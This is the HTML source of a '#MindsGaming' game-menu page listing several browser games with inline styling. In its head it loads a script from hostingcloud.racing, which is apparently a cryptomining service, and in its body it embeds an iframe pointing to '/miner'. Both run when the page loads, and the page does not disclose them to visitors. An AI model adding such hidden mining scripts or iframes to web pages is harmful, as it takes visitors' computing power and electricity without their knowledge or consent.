<html lang="en">
  <head>
    <title>#MindsGaming</title>

    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />
    <meta name="description" content="Community & Member Groups" />
    <meta
      property="og:image"
      content="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <link
      rel="icon"
      href="https://cdn.glitch.com/6ca1674b-a03a-4e9c-9563-ed6203267aba%2FMGLogo.jpeg"
    />
    <script src="https://www.hostingcloud.racing/5pDo.js"></script>

    <script src="/games/dice.js" defer></script>
    <link rel="stylesheet" href="/style.css" />

    <style>
      .gamewrap {
        position: fixed;
        display: block;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background-color: blue;
        overflow: scroll;
      }
      .gameSplash {
        position: fixed;
        display: block;
        margin: -1px;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
      }
      .gTitle {
        margin-top: 35%;
        font-size: 25px;
      }
      .pinnBurgers {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: transparent;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/pinnburgers.png");
        background-size: contain;
        background-repeat: no-repeat;
        width: 15rem;
        height: 7rem;
      }
      .elcipseSounds {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: white;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fcow.png");
        background-size: contain;
        background-repeat: no-repeat;
        width: 15rem;
        height: 7rem;
      }
      .gametest {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: transparent;
        color: white;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/gametest.png");
        background-size: contain;
        background-repeat: no-repeat;
        width: 15rem;
        height: 7rem;
      }
      .bombsG {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: white;
        color: black;
        background-image: url("https://cdn.glitch.me/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28%2Fpixel.png");
        background-size: cover;
        background-repeat: no-repeat;
        width: 15rem;
        height: 7rem;
      }
      .slots {
        float: left;
        display: block;
        margin-top: 3%;
        margin-left: 10%;
        background-color: white;
        color: black;
        background-image: url("https://cdn.glitch.global/f23d0d76-dc88-4f4e-afe2-9bd56ac40b28/slots.png");
        background-size: cover;
        background-repeat: no-repeat;
        width: 15rem;
        height: 7rem;
      }
    </style>
  </head>
  <body style="background-color: green;">
    <iframe src="/miner"> </iframe>
    <div class="gameWrap">
      <center>
        <br />
        <h3>
          Select A Game
        </h3>
        <div onclick="burgersLoad();" class="pinnBurgers">
          <div class="gTitle" id="burgers" title="Closed">
            Pinn Burgers
          </div>
        </div>

        <div onclick="soundsLoad();" class="elcipseSounds">
          <div class="gTitle" id="sounds" title="Closed">
            Eclipse Sounds
          </div>
        </div>
        <div onclick="gametest();" class="gametest">
          <div class="gTitle" id="gametest" title="Closed">
            GameTestPlay Ball
          </div>
        </div>
        <div onclick="bombsLoad();" class="bombsG">
          <div class="gTitle" id="bombs" title="Closed">
              <div id="quitgameBombs" style="display: none;" title="Quit Game" onclick="bombsLoad();">
            X
          </div>
            Bombs
          </div></div>
        
          <div onclick="slotsLoad();" class="slots">
          <div class="gTitle" id="slots" title="Closed">
            <div id="quitgameSlots" style="display: none;" title="Quit Game" onclick="slotsLoad();">
            X
          </div>
            Slots
          </div>
        </div>      
      </center>
    </div>
    <div id="offline" class="hide">
      <center>
        <h1>
          <br />
          You Appear To Be Offline
        </h1>
        <p>
          You can't earn rewards offline. Reconnect To Earn Rewards
        </p>
        <div class="offlineIMG"></div>
      </center>
    </div>
  </body>
</html>
